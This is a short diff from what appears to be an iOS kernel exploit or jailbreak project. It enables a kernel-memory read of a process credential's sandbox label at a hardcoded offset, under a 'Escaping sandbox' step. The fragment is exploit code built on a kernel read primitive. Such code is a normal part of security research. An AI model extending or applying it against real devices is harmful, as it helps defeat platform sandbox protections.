@@ -356,6 +356,7 @@ void testProc(uint64_t kfd) {
     printf("ucred PAC: 0x%llx\n", ucred_pac);
     uint64_t ucred = ucred_pac | 0xffffff8000000000;    
     printf("Escaping sandbox.\n");
-    //uint64_t cr_label_pac = kread64(kfd, ucred + off_ucred_cr_label);
-    //uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
+    uint64_t cr_label_pac = kread64(kfd, ucred + 0x78);
+    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
+    printf("cr_label: 0x%llx\n", cr_label);
 }
